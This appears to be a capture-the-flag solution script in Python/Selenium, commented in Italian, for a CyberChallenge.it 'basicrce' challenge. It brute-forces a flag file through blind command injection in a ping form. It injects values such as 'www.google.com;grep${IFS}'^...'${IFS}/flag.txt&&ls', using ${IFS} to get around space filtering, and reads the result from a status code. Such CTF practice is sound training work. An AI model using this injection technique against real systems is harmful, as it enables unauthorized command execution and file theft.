import os
from selenium import webdriver#devi installarti selenium e chromedriver (io ho fatto con pip)
from selenium.webdriver.common.keys import Keys

#caratteri possibili trovati con l'altro script
alfabeto = "0134cfgilmnostCIPT$^_{}"

chromedriver = "/usr/local/bin/chromedriver"#qua devi cambiare e mettere il tuo path
os.environ["webdriver.chrome.driver"] = chromedriver
driver = webdriver.Chrome(chromedriver)
driver.get("http://basicrce.challs.cyberchallenge.it/")
txt = driver.find_element_by_id("textarea")

new = 'C'#prima lettera trovata a mano

txt.send_keys("www.google.com&&ls")#per aspettare che la pagina si svegli
driver.execute_script("ping()")
c='a'

for x in range(1,30):#30 messo a caso, quando non trova più lettere nuove ha finito e l'ultima è la }
	out = [];

	for lettera in alfabeto:
		c_ = c
		c = lettera
		txt.clear();
		txt.send_keys("www.google.com;grep${IFS}'^"+new+c+"'${IFS}/flag.txt&&ls")
		status = driver.find_element_by_id("status").text[13]
		driver.execute_script("ping()")
		if int(status)==0:
			new = new+c_
			print(new)
			break